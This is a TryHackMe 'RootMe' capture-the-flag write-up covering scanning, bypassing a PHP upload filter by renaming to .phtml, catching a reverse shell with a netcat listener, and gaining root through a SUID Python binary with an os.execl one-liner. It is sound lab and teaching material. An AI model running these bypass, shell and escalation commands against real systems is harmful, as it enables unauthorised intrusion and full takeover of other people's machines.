# RootMe - TryHackMe

## Task 1 - Enumeration

* Started with an Nmap scan.
* Found an HTTP service running on the target.
* Visited the website and explored the available pages.
* Found a file upload functionality.

---

## Task 2 - Upload Bypass

* Tried uploading a PHP reverse shell.
* Got the error:

  ```
  PHP não é permitido!
  ```
* Changed the file extension from `.php` to `.phtml`.
* Upload was accepted.

---

## Task 3 - Reverse Shell

* Downloaded the PentestMonkey PHP reverse shell.
* Changed the IP to my THM VPN IP.
* Changed the port to `4444`.

Started a Netcat listener:

```bash
nc -lvnp 4444
```

Visited the uploaded `php.phtml` file and got a reverse shell.

Checked the current user:

```bash
whoami
```

Output:

```text
www-data
```

---

## Task 4 - User Flag

Searched for the user flag:

```bash
find / -name user.txt 2>/dev/null
```

Read the flag:

```bash
cat /path/to/user.txt
```

---

## Task 5 - Privilege Escalation

Enumerated SUID binaries:

```bash
find / -user root -perm /4000 2>/dev/null
```

Found:

```text
/usr/bin/python2.7
```

Checked GTFOBins and found that Python could be abused because it had the SUID bit set.

Used the following payload:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Verified the shell:

```bash
whoami
```

Output:

```text
root
```

Read the root flag:

```bash
cat /root/root.txt
```

---

# What I Learned

* Always test different PHP extensions if `.php` uploads are blocked.
* Start the Netcat listener **before** triggering the reverse shell.
* Check SUID binaries during enumeration.
* GTFOBins is really useful, but it's even better to understand *why* the payload works instead of just copying it.
* `sh -p` preserves the effective privileges, which is why the Python SUID payload gives a root shell instead of dropping privileges.
